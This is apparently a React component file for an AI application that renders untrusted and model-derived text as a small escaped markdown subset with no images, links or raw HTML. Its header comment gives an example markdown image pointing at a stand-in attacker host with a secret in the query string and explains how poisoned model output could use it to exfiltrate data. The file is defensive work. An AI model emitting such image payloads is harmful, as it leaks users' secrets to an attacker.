import React from 'react';

/**
 * INV-9 — untrusted and model-derived text is rendered escaped. Never as HTML,
 * never auto-linkified, and never as the source of a loaded resource.
 *
 * Why this component exists:
 *
 * Model output is DERIVED from untrusted content and can be poisoned. A
 * markdown renderer turns `![](https://attacker.example/x.png?d=SECRET)` into
 * an <img>, and the browser fetches it the moment it paints. That is a working
 * exfiltration channel needing no tool call, no capability grant, and no
 * cooperation from the model beyond emitting a string.
 *
 * The airlock stops untrusted text from causing an ACTION. It does nothing
 * about the browser being tricked into making a request. This is the other
 * half of the boundary, and it lives in the renderer.
 *
 * ---
 *
 * The first version of this file rendered everything as one flat pre-wrap
 * block. That was safe but unreadable: the assistant emits markdown, so users
 * saw literal `### Heading` and `**bold**` on screen.
 *
 * The fix is NOT to reach back for a markdown library. It is to format a tiny,
 * closed subset ourselves, as React elements:
 *
 *   headings, bold, italic, inline code, bullet and numbered lists.
 *
 * What the subset deliberately EXCLUDES is the whole point:
 *
 *   - no images      -> nothing can trigger a network request
 *   - no links       -> nothing is clickable, no one-click phish
 *   - no raw HTML    -> React escapes every string it renders
 *
 * Because the output is React elements built from parsed text, and never an
 * HTML string, there is no injection surface here at all. An attacker who
 * fully controls the text can, at most, make it bold.
 */

interface UntrustedTextProps {
  text: string;
  className?: string;
  placeholder?: string;
}

/** Inline spans: **bold**, *italic*, `code`. Everything else stays literal. */
function renderInline(raw: string, keyPrefix: string): React.ReactNode[] {
  const out: React.ReactNode[] = [];
  // One pass, three alternatives. Order matters: ** before *.
  const pattern = /(\*\*[^*]+\*\*|\*[^*\n]+\*|`[^`\n]+`)/g;
  let last = 0;
  let m: RegExpExecArray | null;
  let i = 0;

  while ((m = pattern.exec(raw)) !== null) {
    if (m.index > last) out.push(raw.slice(last, m.index));
    const token = m[0];

    if (token.startsWith('**')) {
      out.push(
        <strong key={`${keyPrefix}-b${i}`} className="font-semibold text-[#2c2c24]">
          {token.slice(2, -2)}
        </strong>,
      );
    } else if (token.startsWith('`')) {
      out.push(
        <code
          key={`${keyPrefix}-c${i}`}
          className="rounded border border-[#e5e0d3] bg-[#f3efe6] px-1 py-0.5 font-mono text-[0.85em] text-[#5a5a40]"
        >
          {token.slice(1, -1)}
        </code>,
      );
    } else {
      out.push(
        <em key={`${keyPrefix}-i${i}`} className="italic">
          {token.slice(1, -1)}
        </em>,
      );
    }

    last = m.index + token.length;
    i++;
  }

  if (last < raw.length) out.push(raw.slice(last));
  return out;
}

type Block =
  | { kind: 'h'; level: 2 | 3; text: string }
  | { kind: 'p'; text: string }
  | { kind: 'ul'; items: string[] }
  | { kind: 'ol'; items: string[] };

/** Groups lines into blocks. Deliberately tiny: no tables, quotes, or images. */
function parseBlocks(text: string): Block[] {
  const lines = text.split('\n');
  const blocks: Block[] = [];
  let para: string[] = [];
  let list: { ordered: boolean; items: string[] } | null = null;

  const flushPara = () => {
    if (para.length) {
      blocks.push({ kind: 'p', text: para.join(' ') });
      para = [];
    }
  };
  const flushList = () => {
    if (list) {
      blocks.push(list.ordered ? { kind: 'ol', items: list.items } : { kind: 'ul', items: list.items });
      list = null;
    }
  };

  for (const line of lines) {
    const t = line.trim();

    if (!t) {
      flushPara();
      flushList();
      continue;
    }

    const heading = /^(#{1,6})\s+(.*)$/.exec(t);
    if (heading) {
      flushPara();
      flushList();
      blocks.push({ kind: 'h', level: heading[1].length <= 2 ? 2 : 3, text: heading[2] });
      continue;
    }

    const bullet = /^[-*+]\s+(.*)$/.exec(t);
    if (bullet) {
      flushPara();
      if (!list || list.ordered) {
        flushList();
        list = { ordered: false, items: [] };
      }
      list.items.push(bullet[1]);
      continue;
    }

    const numbered = /^\d+[.)]\s+(.*)$/.exec(t);
    if (numbered) {
      flushPara();
      if (!list || !list.ordered) {
        flushList();
        list = { ordered: true, items: [] };
      }
      list.items.push(numbered[1]);
      continue;
    }

    flushList();
    para.push(t);
  }

  flushPara();
  flushList();
  return blocks;
}

export const UntrustedText: React.FC<UntrustedTextProps> = ({
  text,
  className = '',
  placeholder = 'No content.',
}) => {
  const value = typeof text === 'string' ? text : '';

  if (!value.trim()) {
    return <p className={`text-sm italic text-[#8a8a75] ${className}`}>{placeholder}</p>;
  }

  const blocks = parseBlocks(value);

  return (
    <div className={`space-y-2.5 text-sm leading-relaxed text-[#2c2c24] ${className}`}>
      {blocks.map((b, i) => {
        if (b.kind === 'h') {
          return b.level === 2 ? (
            <h3 key={i} className="mt-1 font-serif text-base font-semibold text-[#2c2c24]">
              {renderInline(b.text, `h${i}`)}
            </h3>
          ) : (
            <h4 key={i} className="mt-1 text-sm font-semibold text-[#434338]">
              {renderInline(b.text, `h${i}`)}
            </h4>
          );
        }

        if (b.kind === 'ul') {
          return (
            <ul key={i} className="ml-1 space-y-1.5">
              {b.items.map((item, j) => (
                <li key={j} className="flex gap-2">
                  <span aria-hidden="true" className="mt-[0.55em] h-1 w-1 shrink-0 rounded-full bg-[#8a8a75]" />
                  <span className="min-w-0 break-words">{renderInline(item, `u${i}-${j}`)}</span>
                </li>
              ))}
            </ul>
          );
        }

        if (b.kind === 'ol') {
          return (
            <ol key={i} className="ml-1 space-y-1.5">
              {b.items.map((item, j) => (
                <li key={j} className="flex gap-2.5">
                  <span className="mt-px shrink-0 font-mono text-xs text-[#8a8a75]">{j + 1}.</span>
                  <span className="min-w-0 break-words">{renderInline(item, `o${i}-${j}`)}</span>
                </li>
              ))}
            </ol>
          );
        }

        return (
          <p key={i} className="break-words">
            {renderInline(b.text, `p${i}`)}
          </p>
        );
      })}
    </div>
  );
};

/**
 * For text the signed-in user typed themselves. Same renderer, different name
 * at the call site so a reader can see which zone is in play.
 *
 * First-party content is not rendered as HTML either: a user who pastes a
 * poisoned string into their own entry should not be able to attack their own
 * browser with it, and the distinction is not worth a second code path.
 */
export const UserText: React.FC<UntrustedTextProps> = (props) => <UntrustedText {...props} />;
